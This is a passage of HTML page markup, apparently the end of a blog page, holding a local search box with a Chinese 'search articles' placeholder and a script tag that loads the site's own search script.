class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
